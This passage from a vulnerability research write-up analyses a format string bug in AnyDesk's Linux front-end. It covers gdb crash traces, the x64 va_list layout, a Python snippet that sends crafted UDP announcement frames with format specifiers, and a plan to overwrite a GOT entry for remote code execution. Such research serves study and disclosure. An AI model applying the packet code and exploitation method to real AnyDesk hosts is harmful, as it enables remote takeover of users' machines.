R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x7f4918657928 &lt;_IO_vfprintf_internal+9624&gt;:	add    eax,0x8
   0x7f491865792b &lt;_IO_vfprintf_internal+9627&gt;:	mov    DWORD PTR &#91;r12],eax
   0x7f491865792f &lt;_IO_vfprintf_internal+9631&gt;:	mov    rax,QWORD PTR &#91;rdx]
=&gt; 0x7f4918657932 &lt;_IO_vfprintf_internal+9634&gt;:	mov    DWORD PTR &#91;rax],r13d
   0x7f4918657935 &lt;_IO_vfprintf_internal+9637&gt;:	jmp    0x7f4918655930 &lt;_IO_vfprintf_internal+1440&gt;
   0x7f491865793a &lt;_IO_vfprintf_internal+9642&gt;:	mov    QWORD PTR &#91;rbp-0x4e8],r11
   0x7f4918657941 &lt;_IO_vfprintf_internal+9649&gt;:	mov    QWORD PTR &#91;rbp-0x4e0],rax
   0x7f4918657948 &lt;_IO_vfprintf_internal+9656&gt;:	call   0x7f4918684150 &lt;_IO_vtable_check&gt;
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --&gt; 0x7f491ec3a6f0 (&lt;gtk_widget_destroy&gt;:	push   rbx)
0008| 0x7ffe12cbb038 --&gt; 0x0 
0016| 0x7ffe12cbb040 --&gt; 0x7ffe12cbb88a (&quot;d%n%p%d$+\201\275\v|'&quot;)
0024| 0x7ffe12cbb048 --&gt; 0x7ffe00000000 
0032| 0x7ffe12cbb050 --&gt; 0x0 
0040| 0x7ffe12cbb058 --&gt; 0x1 
0048| 0x7ffe12cbb060 --&gt; 0xffffffffffffffff 
0056| 0x7ffe12cbb068 --&gt; 0x100000000 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0, 
    format=format@entry=0x7ffe12cbb800 &quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;, ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.
</pre></div>


<p>As we can see, the crash is caused by the instruction <code>mov DWORD PTR [rax], r13d</code> within the function <code>_IO_vfprintf_internal</code>. Since the value of <code>rax</code> is <code>0</code> a segmentation fault is raised. Using the command <code>bt</code> we can print the stacktrace:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [1,7]; title: ; notranslate" title="">
gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0, 
    format=format@entry=0x7ffe12cbb800 &quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;, ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 &quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177&quot;, maxlen=&lt;optimized out&gt;, 
    format=0x7ffe12cbb800 &quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;, args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...
</pre></div>


<p>According to the output the return address after the <code>vsnprintf</code> call is <code>0x8ab34b</code> (<code>#2</code>). Let&#8217;s examine the code at this address in <code>ghidra</code>:</p>



<p><img loading="lazy" width="1210" height="657" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png" alt=""></p>



<p>The call to <code>vsnprintf</code> is at <code>0x8ab346</code>. The third parameter of the function is the format string to be used (<code>local_cb8</code>). A few lines before we can see that the fourth parameter of the outer function (<code>param_4</code>) is copied into <code>local_cb8</code> using <code>strncpy</code>. In order to determine which parameters were passed to <code>vsnprintf</code> let&#8217;s set a breakpoint on the call and resend the payload:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.
</pre></div>

<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./resend.py loot2/host_payload4
</pre></div>

<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,24,32,46]; title: ; notranslate" title="">
&#91;----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x11c5040 --&gt; 0x21 ('!')
RCX: 0x7ffec15e4248 --&gt; 0x3000000010 
RDX: 0x7ffec15e3580 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
RSI: 0x400 
RDI: 0x7ffec15e3980 --&gt; 0x7 
RBP: 0x5 
RSP: 0x7ffec15e34a0 --&gt; 0x7ffec15e3670 --&gt; 0x0 
RIP: 0x8ab346 (call   0x412d90 &lt;vsnprintf@plt&gt;)
R8 : 0x0 
R9 : 0x10 
R10: 0xffffffa0 
R11: 0x7fb9b72f9550 --&gt; 0xfff08320fff08310 
R12: 0x7ffec15e4248 --&gt; 0x3000000010 
R13: 0xb366d8 --&gt; 0x62696c67 ('glib')
R14: 0x2475ec0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffec15e3980 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffec15e3580 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
arg&#91;3]: 0x7ffec15e4248 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --&gt; 0x7ffec15e3670 --&gt; 0x0 
0008| 0x7ffec15e34a8 --&gt; 0x7ffec15e3600 (&quot;lid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
0016| 0x7ffec15e34b0 --&gt; 0x25ed450 --&gt; 0x0 
0024| 0x7ffec15e34b8 --&gt; 0x7ffec15e3600 (&quot;lid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
0032| 0x7ffec15e34c0 --&gt; 0x7ffec15e3820 --&gt; 0x0 
0040| 0x7ffec15e34c8 --&gt; 0x7fb9bbbe89d4 (&lt;g_hash_table_lookup+52&gt;:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --&gt; 0x23e8230 --&gt; 0x2253ab0 --&gt; 0x2244340 --&gt; 0x31 ('1')
0056| 0x7ffec15e34d8 --&gt; 0x2622e60 --&gt; 0x0 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 1, 0x00000000008ab346 in ?? ()
</pre></div>


<p>We hit the breakpoint on the call to <code>vsnprintf</code>. The third parameter (<code>RDX</code>) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: <code>'aaaa%d%n%p%d$+\201\275\v|'</code>. This is our fuzzing input! In the format string! We have found a format string vulnerability.</p>



<p>In this case the actual crash of the application was caused by the <code>%n</code> format specifier within the fuzzer-generated data. The <code>%n</code> format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.</p>



<p>Analyzing the code a little bit further we can determine that the call to <code>vsnprintf</code> prepares a string, which will be written to the log file (<code>~/.anydesk/anydesk.trace</code>). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the <code>glib</code> library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.</p>



<p>Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (<code>'\x85\xfeTEST %p'</code>), we can see the result in <code>~/.anydesk/anydesk.trace</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace 
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.
</pre></div>


<p>The  error message has been written twice to the log file. We can also see how the inserted format specifier (<code>%p</code>) has been evaluated.</p>



<p>After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.</p>



<h1 id="exploit">Exploit</h1>



<p>Within my writeup on <a rel="noreferrer noopener" href="https://devel0pment.de/?p=351#lab4B" target="_blank">RPISEC/MBE lab04B</a> I described the basics on how to exploit a format string vulnerability using the <code>%n</code> format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).</p>



<h2 id="strategy">Strategy</h2>



<p>Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ checksec /usr/bin/anydesk
&#91;*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</pre></div>


<p>Actually no protection mechanisms are enabled, which makes the exploitation more easy.</p>



<p>While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
0
</pre></div>


<p>The first goal we need to achieve is to control the instruction pointer. Since there is <code>No RELRO</code>, we can use the <code>%n</code> format specifier to overwrite an entry within the <code>Global Offset Table</code> (<code>GOT</code>). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the <code>GOT</code> entry point to this shellcode. On the next call of the function, which <code>GOT</code> entry we overwrote, our shellcode is executed.</p>



<p>Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let&#8217;s have a look.</p>



<h2 id="vsnprintf">The v in vsnprintf</h2>



<p>The next instruction after the vulnerable call to <code>vsnprintf</code> is a call to the function <code>time</code>. Accordingly we can overwrite the <code>GOT</code> entry of <code>time</code> and thus redirecting the control flow immediately after the <code>vsnprintf</code> call. In order to use the <code>%n</code> format specifier to overwrite the <code>GOT</code> entry of <code>time</code>, we need to be able to reference the address of the <code>GOT</code> entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current <code>RSP</code>, can be referenced with an appropriate argument selector (e.g. <code>%35$n</code>), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the <code>%n</code> format specifier causes the function to write the amount of characters written so far to this address.</p>



<p>In this case things are a little bit different. As you probably already noticed the vulnerable call is <strong>not</strong> made to the function <code>snprintf</code>, which signature looks like this:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; gutter: false; title: ; notranslate" title="">
snprintf(char *s, size_t n, const char *format, ...)
</pre></div>


<p>…, but rather <code>vsnprintf</code>, which signature looks like this:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; gutter: false; title: ; notranslate" title="">
vsnprintf(char *s, size_t n, const char *format, va_list arg)
</pre></div>


<p>The difference here is that the format string arguments are not directly passed as variable arguments (<code>...</code>), but within a <code>va_list</code> parameter (<code>arg</code>). Each of the functions in the printf family has a corresponding <code>va_list</code> function beginning with the letter <code>v</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ man 3 printf
...

       #include &lt;stdio.h&gt;

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include &lt;stdarg.h&gt;

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);
</pre></div>


<p>The structure of <code>va_list</code> is actually specific to the <code>Application Binary Interface</code> (<code>ABI</code>), which e.g. describes the calling convention, how the stack is organized and so on. On <code>x86</code>, where all function parameters are passed on the stack, <code>va_list</code> simply consists of a pointer to the stack area, where the original parameters are stored. With <code>x64</code> things get a little bit more complex. The first six parameters are passed in registers (<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code>), also there are special registers for floating point parameters (<code>XMM0</code> … <code>XMM7</code>). Additional parameters are passed on the stack as with <code>x86</code>. There is a very good blog post describing the details, which can be found <a rel="noreferrer noopener" href="https://blog.nelhage.com/2010/10/amd64-and-va_arg/" target="_blank">here</a>. The structure of the <code>va_list</code> looks like this on <code>x64</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; gutter: false; title: ; notranslate" title="">
typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list&#91;1];
</pre></div>


<p>There are two pointers: <code>overflow_arg_area</code>, which points to the first argument originally passed on the stack and <code>reg_save_area</code>, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values <code>gp_offset</code> and <code>fp_offset</code> are offsets relative to <code>reg_save_arena</code> and reference the first general register parameter (<code>gp_offset</code>) as well as the first floating point parameter (<code>fp_offset</code>). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).</p>



<p>Let&#8217;s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to <code>vsnprintf</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

</pre></div>


<p>Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
</pre></div>


<p>The beginning of the hostname (<code>'\x85\xfe'</code>) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the <code>%p</code> format specifier to print the values of the first ten arguments.</p>



<p>A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [4,24,33,46]; title: ; notranslate" title="">
&#91;----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x11c5040 --&gt; 0x21 ('!')
RCX: 0x7ffffffeb898 --&gt; 0x3000000010 
RDX: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'&quot;)
RSI: 0x400 
RDI: 0x7ffffffeafd0 --&gt; 0x7 
RBP: 0x5 
RSP: 0x7ffffffeaaf0 --&gt; 0x7ffffffeacc0 --&gt; 0x0 
RIP: 0x8ab346 (call   0x412d90 &lt;vsnprintf@plt&gt;)
R8 : 0x0 
R9 : 0x10 
R10: 0xffffff81 
R11: 0x7ffff1548550 --&gt; 0xfff08320fff08310 
R12: 0x7ffffffeb898 --&gt; 0x3000000010 
R13: 0xb366d8 --&gt; 0x62696c67 ('glib')
R14: 0x1453d80 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'&quot;)
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x7ffffffeacc0 --&gt; 0x0 
0008| 0x7ffffffeaaf8 --&gt; 0x7ffffffeac50 --&gt; 0x20fe85272064696c 
0016| 0x7ffffffeab00 --&gt; 0x158cba0 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x7ffffffeac50 --&gt; 0x20fe85272064696c 
0032| 0x7ffffffeab10 --&gt; 0x7ffffffeae70 --&gt; 0x0 
0040| 0x7ffffffeab18 --&gt; 0x7ffff5e379d4 (&lt;g_hash_table_lookup+52&gt;:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --&gt; 0x138ca30 --&gt; 0x11f6ab0 --&gt; 0x11e7340 --&gt; 0x31 ('1')
0056| 0x7ffffffeab28 --&gt; 0x1572280 --&gt; 0x0 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ 
</pre></div>


<p>The fourth parameter (<code>RCX = 0x7ffffffeb898</code>) is the <code>va_list</code> structure. The first two unsigned ints (4 bytes each) are the members <code>gp_offset</code> and <code>fp_offset</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
</pre></div>


<p>After these values both pointers <code>overflow_arg_area</code> and <code>reg_save_area</code> follow:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
</pre></div>


<p>Since the value of <code>gp_offset</code> is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add <code>gp_offset</code> (<code>0x10</code>) to the <code>reg_save_area</code> pointer (<code>0x00007ffffffeb8b0</code>):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010
</pre></div>


<p><code>vsnprintf</code> assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the <code>overflow_arg_area</code> pointer (<code>0x00007ffffffeb970</code>):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000
</pre></div>


<p>By entering <code>ni</code> the call to <code>vsnprintf</code> is made and we can inspect the resulting string (<code>set print elements 0</code> displays the whole string without truncation):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'&quot;
</pre></div>


<p>The first four parameters were indeed taken from the <code>reg_save_area</code> and all following values from the <code>overflow_arg_arena</code>. The following picture summarizes the structure:</p>



<p><img loading="lazy" width="864" height="768" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png" alt=""></p>



<h2 id="write">Gaining arbitrary write</h2>



<p>After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the <code>reg_save_area</code> or <code>overflow_arg_area</code>, we could store the address of the <code>time GOT</code> entry and write to it using the <code>%n</code> format specifier.</p>



<p>Within the <code>reg_save_area</code> there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the <code>overflow_arg_area</code>. Let&#8217;s have a look at the first 50 values stored there using the <code>telescope</code> command:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --&gt; 0xb366d8 --&gt; 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --&gt; 0x0 
0016| 0x7ffffffeb980 --&gt; 0x1530801 --&gt; 0xe000007ffff17853 
0024| 0x7ffffffeb988 --&gt; 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --&gt; 0x167ec00 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'&quot;)
0040| 0x7ffffffeb998 --&gt; 0x0 
0048| 0x7ffffffeb9a0 --&gt; 0x10 
0056| 0x7ffffffeb9a8 --&gt; 0x7ffff5e501cd (&lt;g_logv+605&gt;:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --&gt; 0x7ffff7a5389b --&gt; 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --&gt; 0x167ec00 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'&quot;)
0080| 0x7ffffffeb9c0 --&gt; 0x1fffeb9d0 
0088| 0x7ffffffeb9c8 --&gt; 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --&gt; 0x0 
0104| 0x7ffffffeb9d8 --&gt; 0x7ffff7a5389b --&gt; 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --&gt; 0x7ffffffeba18 --&gt; 0x7ffff1431f9b (&lt;__GI___libc_realloc+875&gt;:	mov    r8,QWORD PTR &#91;rsp+0x8])
0120| 0x7ffffffeb9e8 --&gt; 0x0 
0128| 0x7ffffffeb9f0 --&gt; 0x155dd20 --&gt; 0x7fffdc00f3d0 --&gt; 0x1514300 --&gt; 0x1513da0 --&gt; 0x14d6e00 (--&gt; ...)
0136| 0x7ffffffeb9f8 --&gt; 0x0 
0144| 0x7ffffffeba00 --&gt; 0x500000000 
0152| 0x7ffffffeba08 --&gt; 0x7ffff5e9acd8 (&quot;Invalid UTF-8 encoded text in name - not valid '%s'&quot;)
0160| 0x7ffffffeba10 --&gt; 0x0 
0168| 0x7ffffffeba18 --&gt; 0x7ffff1431f9b (&lt;__GI___libc_realloc+875&gt;:	mov    r8,QWORD PTR &#91;rsp+0x8])
0176| 0x7ffffffeba20 --&gt; 0x7ffff5e969e1 --&gt; 0x4600303262696c67 ('glib20')
...
</pre></div>


<p>We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don&#8217;t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can&#8217;t control any data, which we can access with the format string. Is this already a dead end? Of course not!</p>



<p>Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset <code>112</code> the stack address <code>0x7ffffffeba18</code> is stored, which corresponds to offset <code>168</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
...
0112| 0x7ffffffeb9e0 --&gt; 0x7ffffffeba18 --&gt; 0x7ffff1431f9b (&lt;__GI___libc_realloc+875&gt;:	mov    r8,QWORD PTR &#91;rsp+0x8])
...
0168| 0x7ffffffeba18 --&gt; 0x7ffff1431f9b (&lt;__GI___libc_realloc+875&gt;:	mov    r8,QWORD PTR &#91;rsp+0x8])
...

</pre></div>


<p>If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:</p>



<p><img loading="lazy" width="1104" height="384" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png" alt=""></p>



<p>The problem here is that we cannot do this in a single call of <code>vsnprintf</code>. All referenced data is fetched <strong>before</strong> data is written by the <code>%n</code> format specifier. This means that the <code>%19$ln</code> would indeed overwrite the data on the stack, but the <code>%26$ln</code> would still evaluate to the old value, which was stored there. Accordingly we need two calls:</p>



<ol><li>Store address of <code>time</code> <code>GOT</code> entry on the stack</li><li>Write to previously stored <code>GOT</code> entry address in order to control instruction pointer</li></ol>



<p>As you may remember, the vulnerable call to <code>vsnprintf</code> is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. <code>%26$ln</code>) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use <code>%200$n</code> on the first call, to write the <code>GOT</code> address on the stack, we need to ensure that <code>%200$n</code> on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for <code>%n</code> we use to store the <code>GOT</code> address but also for the second <code>%n</code>, we need to use in order to actually write to the <code>GOT</code> entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.</p>



<p>Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let&#8217;s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to <code>vsnprintf</code>. We still must ensure that the <code>%n</code> used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one <code>%n</code> format specifier in each pair of calls, stack values can be found to fulfill this requirement.</p>



<p>Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of <code>vsnprintf</code>. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.</p>



<p>While thinking about this and looking at the GUI another idea came into my mind:</p>



<p><img loading="lazy" width="796" height="466" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png" alt=""></p>



<p>The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let&#8217;s verify this by sending the following announcement frame:</p>


